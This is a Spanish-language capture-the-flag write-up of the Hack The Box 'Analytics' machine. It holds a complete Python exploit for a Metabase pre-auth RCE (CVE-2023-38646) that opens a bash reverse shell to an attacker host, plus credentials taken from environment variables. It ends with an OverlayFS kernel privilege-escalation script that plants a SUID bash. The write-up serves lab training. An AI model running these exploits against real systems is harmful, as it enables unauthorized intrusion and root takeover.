# Introducción
---
La máquina Analytics de Hack The Box se centra en la plataforma Metabase, presenta una combinación de vulnerabilidades que van desde una RCE pre-autenticación hasta una escalada de privilegios a través de una vulnerabilidad en el kernel.
Este write-up detalla el proceso de enumeración, explotación y escalada de privilegios para obtener acceso al usuario y obtener el control total del sistema.

# Reconocimiento
---
`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.233 -oG ports`

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 13:48 -03
Initiating SYN Stealth Scan at 13:48
Scanning 10.10.11.233 [65535 ports]
Discovered open port 80/tcp on 10.10.11.233
Discovered open port 22/tcp on 10.10.11.233
Completed SYN Stealth Scan at 13:48, 14.93s elapsed (65535 total ports)
Nmap scan report for 10.10.11.233
Host is up, received user-set (0.16s latency).
Scanned at 2023-12-15 13:48:24 -03 for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
           Raw packets sent: 73134 (3.218MB) | Rcvd: 72895 (2.916MB)
```

`nmap -p 22,80 -n -Pn -sCV 10.10.11.233 -oN openPorts`

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 13:50 -03
Nmap scan report for 10.10.11.233
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
```

En la fase inicial, se realizó una extensa enumeración de puertos utilizando [Nmap](https://nmap.org/).
La dirección IP se resolvió mediante la configuración del archivo `/etc/hosts`:
`echo "<target-ip>  analytical.htb data.analytical.htb" >> /etc/hosts`

Se identificaron los servicios en los puertos 22 y 80, este último redirigiendo a `http://data.analytical.htb`. Este redireccionamiento es crucial para la posterior explotación de Metabase.

# Descubrimiento de la vulnerabilidad
---
La investigación reveló una vulnerabilidad pre-autenticación en Metabase, específicamente [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646). Este fallo permite la ejecución remota de código, proporcionando acceso al servidor.
Un minucioso detalle acerca de la vulnerabilidad se encuentra en [Pre-Auth RCE in Metabase (CVE-2023-38646)](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/).

# Explotación de la Vulnerabilidad
---
Se creó un script en Python para aprovechar la vulnerabilidad, estableciendo una conexión inversa al servidor objetivo. El script aprovecha la vulnerabilidad para ejecutar una shell interactiva, permitiendo al atacante el control total del sistema.

```python
#!/usr/bin/python3

import sys, signal, requests, json, base64, threading, argparse
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Analytics Reverse Shell")
    parser.add_argument("-lh", "--lhost", dest="lhost", required=True, help="Your IP (Ex: -lh 192.168.0.1)")
    parser.add_argument("-lp", "--lport", dest="lport", required=True, help="Listening port (Ex: --lport 1234)")
    options = parser.parse_args()

    return options.lhost, options.lport

def get_setup_token():
    response = requests.get("http://data.analytical.htb/api/session/properties", verify=False)
    data = response.json()
    setup_token = data.get("setup-token")
    return setup_token

def create_payload(lhost, lport):
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload_base64 = base64.b64encode(payload.encode()).decode()
    return payload_base64

def get_reverse_shell():
    shell_url = "http://data.analytical.htb/api/setup/validate"    
    headers = {"Content-Type": "application/json"}
    shell_data = {
        "token": setup_token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload_base64}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "an-sec-research-team",
            "engine": "h2"
        }
    }
    response = requests.post(shell_url, headers=headers, data=json.dumps(shell_data))

if __name__ == '__main__':
    
    lhost, lport = get_arguments()

    setup_token = get_setup_token()
    print(f"\n[+] Setup token: {setup_token}\n")

    payload_base64 = create_payload(lhost, lport)

    threading.Thread(target=get_reverse_shell, args=()).start()

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

Con el acceso adquirido a través de la vulnerabilidad de Metabase, se procedió a investigar y descubrir credenciales almacenadas en las variables de entorno (`env`). Se identificaron las siguientes credenciales:

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Estas credenciales permitieron el acceso mediante SSH al servidor objetivo. Utilizando el comando:
```bash
ssh metalytics@<target-ip>
An4lytics_ds20223#
```

Se estableció una conexión SSH exitosa, otorgando acceso al sistema como el usuario `metalytics`.
## User Flag
---
Una vez dentro del sistema, se ubicó la user flag en el directorio `/home/metalytics`.
# Escalada de privilegios
---
La fase de escalada de privilegios aprovechó una vulnerabilidad en el kernel [CVE-2023-2640 Detail](https://nvd.nist.gov/vuln/detail/CVE-2023-2640) detectado con el comando `uname -rs`.

Se utilizó un script con el comando `unshare` para obtener privilegios de root. Posteriormente, se obtuvo acceso al sistema como el usuario `root`.

```bash
#!/bin/bash

tmp_bash=/var/tmp/bash

echo -e "\n[+] Comprobando si el archivo '/var/tmp/bash' existe"

if [ -e "$tmp_bash" ] && [ -u "$tmp_bash" ]; then
	echo -e "\n[+] El archivo bash existe y tiene permisos SUID"
	ls -l /var/tmp/bash
	echo -e "\n[+] Ganando acceso como root\n"
	/var/tmp/bash -p
else
	echo -e "\n[!] El archivo $tmp_bash no existe\n"
	unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
fi
```

## Root Flag
---
Con privilegios de root, se localizó la root flag en el directorio `/root`.